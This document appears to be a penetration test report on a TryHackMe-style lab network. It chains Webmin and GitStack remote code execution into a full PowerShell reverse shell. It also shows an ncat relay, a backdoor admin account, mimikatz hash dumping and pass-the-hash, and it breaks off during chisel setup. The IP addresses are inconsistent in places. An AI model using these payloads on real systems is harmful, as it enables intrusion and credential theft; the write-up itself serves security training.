
# Wreath Network Penetration Test Report                                                                              2023‑01‑22

## Executive Summary

I was contracted by Thomas Wreath to conduct a penetration test in order to determine its exposure to a targeted attack. All activities were conducted in a manner that simulated a malicious actor engaged in a targeted attack against Thomas Wreath network with the goals of:
Identifying if a remote attacker could penetrate MegaCorp One’s defenses
Determining the impact of a security breach on:
Confidentiality of the company’s private data
Internal infrastructure and availability of MegaCorp One’s information systems
Efforts were placed on the identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorized access to organizational data. The attacks were conducted with the level of access that a general Internet user would have. The assessment was conducted in accordance with the recommendations outlined in NIST SP 800-­‐1151 with all tests and actions being conducted under controlled conditions.

### Scope
The network was made up of three machines: two windows and a linux one. Thomas Wreath only provided the ip address of the public‑facing linux host. The scope of the assessment included the following:
1. Public‑facing linux server: 10.200.84.200: prod‑serv
2. Internal windows hosts: 10.200.84.150: git‑serv
3. Personal computer: 10.200.84.100: wreath‑pc

### Timeline
|    Host          |         Date        |           Activity           |
|------------------|---------------------|------------------------------|
|10.200.84.200     |      2023-01-09     |      Start of engagement     |
|10.200.84.200     |      2023-01-10     |      Enumeration, Compromise |
|10.200.84.150     |      2023-01-12     |      Pivoting, Enumeration   |
|10.200.84.150     |      2023-01-12     |      Compromise              |
|10.200.84.150     |      2023-01-13     |      Post Exploitation       |
|10.200.84.100     |      2023-01-14     |      Pivoting, Enumeration   |
|10.200.84.100     |      2023-01-16     |      Compromise              |
|10.200.84.100     |      2023-01-17     |      Privilege Escalation    |
|10.200.84.100     |      2023-01-18     |      Data Exfiltration       |

## Summary of Results

During my work, I successfully found several critical vulnerabilities, including the ability to execute arbitrary commands on each of the above hosts, which could lead to a complete compromise of the Wreath network.
Initial reconnaissance of the Wreath 10.200.83.200 network led to the discovery of a Webmin workstation that was vulnerable to a remote code execution vulnerability. This initial compromise led to root access to a public linux web server.
Using the compromised web server as a foothold, I was able to gain access to internal hosts. After scouting these hosts, I was able to determine that I only had access to 10.200.83.150. On this host, I found a vulnerable version of GitStack that was prone to a remote code execution vulnerability.
This allowed me to gain administrative access to 10.200.84.150, the git-serv windows host. This host also had a git repository of a web page that contained a file upload form that used weak filters.
Using the two already compromised servers as a guide, I was able to access 10.200.83.100 and view a list of its open ports. I was able to determine that the website corresponds to the git repository I found earlier. I was able to bypass the file upload filters and craft an exploit in order to achieve remote code execution on the server.

## Findings and Remediations

10.200.84.200
Critical - Unauthenticated Remote Code Execution Webmin
CVE ID:                 CVE-2019-15107     
Description:         An issue was discovered in Webmin <=1.920. The parameter old in      
                              password_change.cgi contains a command injection vulnerability.                            
Mitigation:           Consider updating the software in use to the latest version


10.200.84.150
Critical - GitStack 2.3.10 Unauthenticated Remote Code Execution
CVE ID:                CVE-2018-5955    
Description:        An issue was discovered in GitStack through 2.3.10. User controlled                    
                             input is not sufficiently filtered, allowing an unauthenticated attacker to          
                             add a user to the server via the username and password fields to the          
                             rest/user/ URI.                          
Mitigation:          Consider updating the software in use to the latest version
  		 		 			
10.200.84.100
Critical - File Upload Remote Code Execution
Description:        An issue was discovered in the filtering of the file upload form. The file      
                             extension whitelist is bypassable by providing more dots in the filename 
                             eg: image.png.php. A malicious actor may provide a php payload in the 
                             .exif data of an image to execute arbitrary commands.                        
Mitigation:          Consider changing the password of http basic authentication and                      
                             implementing a  more secure file‑upload application with proper                                                  
                             filtering.

## Attack Narrative

### 10.200.84.200

#### Initial information
The IP address of the publicly available host is 10.200.84.200

#### Initial enumeration
##### Nmap scan
```
nmap -sCV -T4 -vv 10.200.84.200  
Scanning 10.200.84.200 [1000 ports]
**Discovered open port 22/tcp on 10.200.84.200
Discovered open port 443/tcp on 10.200.84.200
Discovered open port 80/tcp on 10.200.84.200
Discovered open port 10000/tcp on 10.200.84.200**
Not shown: 952 filtered tcp ports (no-response), 43 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    REASON       VERSION
22/tcp    open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfKbbFLiRV9dqsrYQifAghp85qmXpYEHf2g4JJqDKUL316TcAoGj62aamfhx5isIJHtQsA0hVmzD+4pVH4r8ANkuIIRs6j9cnBrLGpjk8xz9+BE1Vvd8lmORGxCqTv+9LgrpB7tcfoEkIOSG7zeY182kOR72igUERpy0JkzxJm2gIGb7Caz1s5/ScHEOhGX8VhNT4clOhDc9dLePRQvRooicIsENqQsLckE0eJB7rTSxemWduL+twySqtwN80a7pRzS7dzR4f6fkhVBAhYflJBW3iZ46zOItZcwT2u0wReCrFzxvDxEOewH7YHFpvOvb+Exuf3W6OuSjCHF64S7iU6z92aINNf+dSROACXbmGnBhTlGaV57brOXzujsWDylivWZ7CVVj1gB6mrNfEpBNE983qZskyVk4eTNT5cUD+3I/IPOz1bOtOWiraZCevFYaQR5AxNmx8sDIgo1z4VcxOMhrczc7RC/s3KWcoIkI2cI5+KUnDtaOfUClXPBCgYE50=
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFccvYHwpGWYUsw9mTk/mEvzyrY4ghhX2D6o3n/upTLFXbhJPV6ls4C8O0wH6TyGq7ClV3XpVa7zevngNoqlwzM=
|   256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINLfVtZHSGvCy3JP5GX0Dgzcxz+Y9In0TcQc3vhvMXCP
80/tcp    open   http       syn-ack      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to <https://thomaswreath.thm>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp   open   ssl/http   syn-ack      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-08T09:54:23
| Not valid after:  2025-01-07T09:54:23
| MD5:   fc99:d052:e9d2:8a96:b473:cb38:6d82:9784
| SHA-1: df6f:fe3c:4459:4173:6b6c:0c5a:d813:9f76:4135:fda7
| -----BEGIN CERTIFICATE-----
| MIIELTCCAxWgAwIBAgIUDXCuLSW4/LQxHwYsj191DwHi2G0wDQYJKoZIhvcNAQEL
| …
| jqEVFa51cKlTDP1JVlo3eA5WP4XjbkB203UIcyaUeLhYJrY/YZxJ4NGYU+V7nEg+
| lj4nowi851Ug4R1HqmLyR4E=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
9090/tcp  closed zeus-admin conn-refused
**10000/tcp open   http       syn-ack      MiniServ 1.890 (Webmin httpd)**
|_http-server-header: MiniServ/1.890
|_http-favicon: Unknown favicon MD5: 8E8E99E610C1F8474422D68A4D749607
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Figure 1. Nmap Full port scan

#### https ‑ thomaswreath.thm ‑ 80/tcp
Making a get request to the ip with curl reveals that it tried to make a redirect to a domain   thomaswreath.thm
```
curl -s -v 10.200.184.200 * Trying 10.200.184.200:80...
 * Connected to 10.200.84.200 (10.200.101.200) 
port 80 > GET / HTTP/1.1 > 
Host: 10.200.84.200 > 
User-Agent: curl/8.4.0 > 
Accept: */* > < 
HTTP/1.1 302 Found < 
Date: Thu, 25 Jan 2024 11:42:22 GMT < 
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c < 
Location: https://thomaswreath.thm < Content-Length: 208 < Content-Type: text/html; charset=iso-8859-1 < <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>302 Found</title> </head><body> <h1>Found</h1> <p>The document has moved <a href="https://thomaswreath.thm">here</a>.</p> </body></html>
 * Connection #0 to host 10.200.84.200 left intact
```

The ip redirects to https://thomaswreath.thm, which means thomaswreath.thm needs to be added to the /etc/hosts file as seen in the following code snippet to make it accessible from a web Browser.
/etc/hosts:

`10.200.84.200   thomaswreath`



#### https ‑ thomaswreath.thm ‑ 443/tcp
Thomas posted his CV to this webpage. This CV contained some personal information like phone numbers.

<img src="./screenshots/0001.jpg" alt="thomaswreath.thm" style="width:800px;"/>

#### https ‑ 10.200.84.200 ‑ 10000/tcp
As the nmap scan revealed (Figure 1), Webmin 1.890 was running on port 10000

<img src="./screenshots/0024.jpg" alt="thomaswreath.thm" style="width:800px;"/>

### Searching for CVE
A simple search for  exploit Webmin MiniServ 1.890 (Webmin httpd) revealed an Github Link with proof of concept code mentioning that the version Webmin 1.890 is vulnerable to Unauthenticated Remote Code Execution.

<img src="./screenshots/0025.jpg" alt="thomaswreath.thm" style="width:800px;"/>

At this step I have two ways to exploit: 
1. Using the proof of concept source code from https://medium.com/@foxsin34/webmin-1-890-exploit-unauthorized-rce-cve-2019-15107-23e4d5a9c3b4; 
2. Using Metasploit module for Webmin

```
Exploit using Metasploit
msf6 > search webmin 
Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Execution 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit/linux/http/webmin_file_manager_rce 2022-02-26 excellent Yes Webmin File Manager RCE 3 exploit/linux/http/webmin_package_updates_rce 2022-07-26 excellent Yes Webmin Package Updates RCE 4 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE 6 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 7 exploit/linux/http/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/webmin_backdoor 
msf6 > use 7 
[*] Using configured payload cmd/unix/reverse_perl 
msf6 exploit(linux/http/webmin_backdoor) > options 
Module options (exploit/linux/http/webmin_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://docs. metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions SSLCert no Path to a custom SSL certificate (def ault is randomly generated) TARGETURI / yes Base path to Webmin URIPATH no The URI to use for this exploit (defa ult is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on t he local machine or 0.0.0.0 to listen o n all addresses. SRVPORT 8080 yes The local port to listen on. Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) View the full module info with the info, or info -d command. msf6 exploit(linux/http/webmin_backdoor) > 
set LHOST 10.50.102.41 
set SSL True 
set RHOSTS 10.200.101.200 
msf6 exploit(linux/http/webmin_backdoor) > run 
[*] Started reverse TCP handler on 10.50.102.41:4444 [*] Running automatic check ("set AutoCheck false" to disable) [+] The target is vulnerable. [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.50.102.41:4444 -> 10.200.101.200:53346) at 2024-01-23 13:08:10 -0600 whoami root ^Z Background session 1? [y/N] y 
msf6 exploit(linux/http/webmin_backdoor) > search shell_to_meterpreter Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter Upgrade Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter msf6 
exploit(linux/http/webmin_backdoor) > use 0 
msf6 post(multi/manage/shell_to_meterpreter) > options 
Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto d etect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on View the full module info with the info, or info -d command. msf6 post
(multi/manage/shell_to_meterpreter) > set LHOST 10.50.102.41 
LHOST => 10.50.102.41 
msf6 post(multi/manage/shell_to_meterpreter) > set session 1 
session => 1 
msf6 post(multi/manage/shell_to_meterpreter) > run 
[*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.50.102.41:4433 [*] Sending stage (1017704 bytes) to 10.200.101.200 [*] Command stager progress: 100.00% (773/773 bytes) [*] Post module execution completed msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Meterpreter session 2 opened (10.50.102.41:4433 -> 10.200.101.200:33474) at 2024-01-23 13:11:41 -0600 [*] Stopping exploit/multi/handler Interrupt: use the 'exit' command to quit 
msf6 post(multi/manage/shell_to_meterpreter) > sessions 
Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell cmd/unix 10.50.102.41:4444 -> 10.200.101.200:53346 (10.200.101.200) 2 meterpreter x86/linux root @ 10.200.101.200 10.50.102.41:4433 -> 10.200.101.200:33474(10.200.101.200) msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2 
[*] Starting interaction with 2... 
meterpreter > getuid 
Server username: root 
meterpreter > cat /root/.ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtc
-[SNIP]-
EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg== 
-----END OPENSSH PRIVATE KEY----- 
```

A little enumeration revealed the root user’s private ssh key.

 An attacker could save this ssh key in order to directly access the host without any password
 ```
ssh root@10.200.101.200 -i wreathIrsa
[root@prod-serv ~]# hostname;whoami;ip a
prod-serv
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
	link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	inet 127.0.0.1/8 scope host lo
   	valid_lft forever preferred_lft forever
	inet6 ::1/128 scope host
   	valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
	link/ether 02:ee:a2:99:c8:ab brd ff:ff:ff:ff:ff:ff
	inet 10.200.101.200/24 brd 10.200.101.255 scope global dynamic noprefixroute eth0
   	valid_lft 3555sec preferred_lft 3555sec
	inet6 fe80::ee:a2ff:fe99:c8ab/64 scope link
   	valid_lft forever preferred_lft forever
[root@prod-serv ~]# 
```
<img src="./screenshots/0026.jpg" alt="thomaswreath.thm" style="width:800px;"/>

### Internal network enumeration
An attacker would go further enumerating internal resources.

Transfer nmap to the compromised host
I downloaded static version of nmap to my attacker host, then I hosted id using  `python3 -m http.server 80` command on attacker machine and used curl command `curl 10.50.85.11/nmap_service -o /tmp/nmap_service && chmod +x /tmp/nmap_service` to download the static nmap binary to the target host `10.200.84.200`.

```
[root@prod-serv tmp]# ./nmap_service -sn 10.200.84.1-255 -oN scan-lizard 
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-01-09 19:26 GMT Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for ip-10-200-84-1.eu-west-1.compute.internal (10.200.84.1) Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed Host is up (0.00038s latency). 
MAC Address: 02:F3:70:5F:3A:E7 (Unknown) 
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100) Host is up (0.00015s latency). MAC Address: 02:3F:34:C0:2D:35 (Unknown) 
Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150) Host is up (-0.10s latency). MAC Address: 02:18:AF:B1:63:CB (Unknown) 
Nmap scan report for ip-10-200-84-250.eu-west-1.compute.internal (10.200.84.250) Host is up (0.00027s latency). MAC Address: 02:9C:9D:AF:36:F5 (Unknown) 
Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200) Host is up. Nmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```
<img src="./screenshots/0027.jpg" alt="thomaswreath.thm" style="width:800px;"/>

Active hosts are 10.200.84.1, 10.200.84.100, 10.200.84.150, 10.200.84.200, and
10.200.84.250

> There are some excluded hosts because of the nature of the TryHackMe infrastructure.
> These excluded hosts are 10.200.84.1, 10.200.84.250.
> The attacker’s targets are 10.200.84.100, and 10.200.84.150.

Identifying open ports on discovered hosts
An attacker would then use nmap on the found target hosts to identify any open ports.

Scanning hosts revealed open ports **80, 3389, 5985** on **10.200.84.150** which means it is accessed from **10.200.83.200** and no open ports on **10.200.84.100**

### 10.200.84.150
#### Enumeration
The previous nmap scan revealed three open ports on 10.200.83.150. These open ports are 80-http, 3389-ms-wbt-server, and 5985-wsman. Note that the last port is the winrm port which could be used to get a winrm shell on the system if an attacker has valid credentials.

#### http-10.200.84.150-80/tcp
I used sshuttle to make 10.200.84.150 accessible from my attacker host. Note that I saved the previously found ssh key which is necessary to make sshuttle work

```
$ sshuttle -r root@10.200.84.200 10.200.84.0/24 --ssh-cmd "ssh -i wreathIrsa" -x 10.200.84.200 
c : Connected to server.
```

After the sshuttle connection, 10.200.84.150 was accessible from the attacker’s browser.

<img src="./screenshots/0002.jpg" alt="thomaswreath.thm" style="width:800px;"/>

The page revealed:

registration/login

gitstack/

rest/

Browsing to /gitstack/ reveals the same loginpage as /registration/login/.


The 10.200.84.150 was running GitStack but the default credentials did not work on the login form (admin:admin).
Browsing /rest/ reveals new endpoints because of the verbose 404 page.

Searching for CVE’s
The attacker would search for known vulnerabilities for GitStack service
`searchsploit gitstack`

```
searchsploit gitstack -------------------------------------------------------------- --------------------------------- 
Exploit Title                                                 | Path 
-------------------------------------------------------------- --------------------------------- 
GitStack - Remote Code Execution                              | php/webapps/44044.md 
GitStack - Unsanitized Argument Remote Code Execution (Metasp | windows/remote/44356.rb GitStack 2.3.10 - Remote Code Execution                       | php/webapps/43777.py
 -------------------------------------------------------------- --------------------------------- 
Shellcodes: No Results
```

I download the script and add shebang at first line to tell the python what interpreter should be used, also set the targets IP `nano 43777.py`

```
  GNU nano 7.2                    	43777.py *                           
#!/usr/bin/python2
–[SNIP]--
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '10.200.84.150'

# What command you want to execute
command = "whoami"
--[SNIP]--
```

### Usage of the exploit
I run edited script
```
python3 43777.py 
[+] Get user list 
[+] Found user twreath 
[+] Web repository already enabled 
[+] Get repositories list 
[+] Found repository Website 
[+] Add user to repository 
[+] Disable access for anyone 
[+] Create backdoor in PHP b'Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. ' 
[+] Execute command b'"nt authority\\system\r\n" \r\n'
```

The exploit’s defaults are set to run the whoami command and the exploit returned the output which is nt authority\system. This means that the GitStack service runs as administrator. This should be fixed and the program must run as a low‑privileged user.
From this point, an attacker would try several commands in order to get more information regarding the structure of the network and the compromised hosts.
Note that the exploit used before creates a file named exploit.php which can be accessed from a browser or curl at 10.200.83.150/web/exploit.php. The php code in this file would execute anything which would be provided in a GET parameter.
For sake of simplicity, I used curl and tested a whoami command by directly accessing this php file:

<img src="./screenshots/0030.jpg" alt="thomaswreath.thm" style="width:800px;"/>

I send the packets to myself to see if target is allowed to connect to the outside world:
```
curl -X POST <http://10.200.84.150/web/exploit.php> -d "a=ping -n 3 10.50.85.11"
Pinging 10.50.85.11 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.85.11:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
"
```

To catch the ping we will use `tcpdump -i tun0 icmp` because ping just sends icmp packets.
```
sudo tcpdump -i tun0 icmp
[sudo] password for lizard:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

It doesn’t catch anything. That means there’s some sort of firewall still blocking the outbound connection to our machine.
Setting up a relay using Netcat binary on 10.200.84.200 (compromised linux host) in order to access 10.200.84.150 (compromised windows host) with a reverse shell

An attacker could use this behavior to set up a port forward to be able to access 10.200.84.150 directly from the attacker machine.
The following steps should be taken to successfully set up a relay between the compromised linux host and the attacker machine:
Transfer netcat static binary to 10.200.84.200
Disable the firewall on the desired port
Set up the netcat relay
Use powershell.exe to open a reverse shell to our attacker host

I Create a firewall rule in order to open a port (33000 in this case) on exploited machine 10.200.84.200:
```
ssh root@10.200.84.200 -i wreathIrsa 
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 33000/tcp
```

Transfer netcat binary on target machine (in fact jump host) from attack machine https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat and Open netcat listener (before that I used command `python3 -m http.server 80` to host the ncat binary from attacker machine to target host):
```
[root@prod-serv ~]# curl <attackMachineIp>/ncat -o /tmp/ncat && chmod +x /tmp/ncat
[root@prod-serv ~]# cd /temp 
[root@prod-serv tmp]# ./ncat -lvnp 33000
```

I will use 
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.84200',33000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
I encode the shell at https://www.urlencoder.org/ (url-encode), and the final shell is:
```
powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C33000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

I send the curl command with POST method, with the shell with value of “a”:
```
curl -X POST http://10.200.84.150/web/exploit.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPCl
-[SNIP]--
dbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

The netcat listener is revealing the success of reverse shell:
```
[root@prod-serv tmp]# ./ncat -lvnp 33000 
whoami
nt authority\system
PS C:\GitStack\gitphp\doc>
```

#### Creating a new user
Attacker should stabilize in a system. I created a new user with Admin rights, add him to local Admin group and Management group. The operations listed below.
```
PS C:\GitStack\gitphp> net user timtim 1235Qwert! /add 
The command completed successfully. 
PS C:\GitStack\gitphp> net localgroup Administrators timtim /add 
The command completed successfully. 
PS C:\GitStack\gitphp> net localgroup "Remote Management Users" timtim /add 
The command completed successfully. 
PS C:\GitStack\gitphp> net user timtim
User name                    timtim 
—-[SNIP]--   
Account active               Yes 
Local Group Memberships      *Administrators     *Remote Management Use 
*Users Global Group memberships *None 
The command completed successfully.
```

Connecting to the host as a new user:
```
evil-winrm -u timtim -p '1235Qwert!' -i 10.200.84.150 
Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint
PS C:\Users\timtim\Documents> whoami 
git-serv\timtim
PS C:\Users\timtim\Documents> whoami /groups 
GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ============ ================================================== 
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114 Group used for deny only 
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
BUILTIN\Administrators Alias S-1-5-32-544 Group used for deny only 
BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Mandatory Level Label S-1-16-8192
```

Connecting via rdp to get full access instead of the medium integrity evil‑winrm shell
An attacker would be able to connect to rdp in order to be able to get full integrity shells on the rdp session. In this case, I used xfreerdp to connect to the machine and I also mounted a directory that contained mimikatz to be able to dump user hashes from the host. This particular directory is /home/lizard/Downloads/mimikatz/x64/mimikatz.exe on my kali machine:
```
$ xfreerdp /v:10.200.84.150 /u:timtim /p:1235Qwert! +clipboard /dynamic-resolution /drive:/home/lizard/Downloads/mimikatz/x64,share
```

I opened cmd as Administrator an enter the following command to execute mimikatz on target machine:
```
C:\\Windows\\system32> \\\\tsclient\\share\\mimikatz\\x64\\mimikatz.exe
```

After mimikatz starts I dumped the NTLM hashes from target machine (10.200.84.150):
```
C:\Windows\system32>\\tsclient\share\mimikatz.exe 
mimikatz # privilege::debug
 Privilege '20' OK 
mimikatz # token::elevate 
Token Id : 0 User name : SID name : NT AUTHORITY\SYSTEM 672 {0;000003e7} 1 D 20122 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary -> Impersonated ! * Process Token : {0;000cab03} 2 F 1888156 GIT-SERV\timtim
—-[SNIP]--
mimikatz # lsadump::sam 
—-[SNIP]--
RID : 000001f4 (500) 
**User : Administrator 
Hash NTLM: 37db630168e -—[SNIP]—- 05c6bbd1** 
-–[SNIP]--
RID : 000003e9 (1001) 
User : Thomas
**Hash NTLM: 02d90eda8f6 -–[SNIP]-- 2d5f207831101f** 
-–[SNIP]--
User : timtim 
Hash NTLM: e1561f11de -—[SNIP]—- 5b2b8cac2f23a 
-—[SNIP]-- 
```
<img src="./screenshots/0032.jpg" alt="thomaswreath.thm" style="width:2000px;"/>

#### Cracking the hash
It is important to note that user Thomas’s NTLM hash is crackable easily via an online tool https://crackstation.net/

<img src="./screenshots/0033.jpg" alt="thomaswreath.thm" style="width:800px;"/>

Maintaining access to the compromised host and enumeration

I had access to the Administrator’s NTLM hash which allowed me to maintain persistent
access on 10.200.84.150. I used evil-winrm to connect to the windows host with the pass the hash technique.

```
$ evil-winrm -u Administrator -H '37db63016  --[SNIP]----  61e05c6bbd1' -i 10.200.84.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/ 
```

<img src="./screenshots/0034.jpg" alt="thomaswreath.thm" style="width:800px;"/>

### 10.200.84.100

#### Enumeration of 10.200.84.100 from the compromised windows host (10.200.84.150)

Note, enumeration could be easily done with the use of Empire framework’s Powershell scripts using “-s” option of evil-enum to specify the path to Empire’s scripts.

```
PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50
Hostname  	: 10.200.101.100
alive     	: True
openPorts 	: {80, 3389}
filteredPorts : {445, 443, 21, 23...}
```

### Creating a Prot Forwarding with Chisel

First, I allow a port through the firewall
```
C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="lizard" dir=in action=allow protocol=tcp localport=41000
Ok.
```

Then transfered chisel windows binary to the Git-Server
```
PS C:\Users\Administrator\Documents> upload /home/lizard/Downloads/chisel.exe C:\Windows\temp\chisel.exe
```

Next, started the client that sends the connection on may attacker machine
```
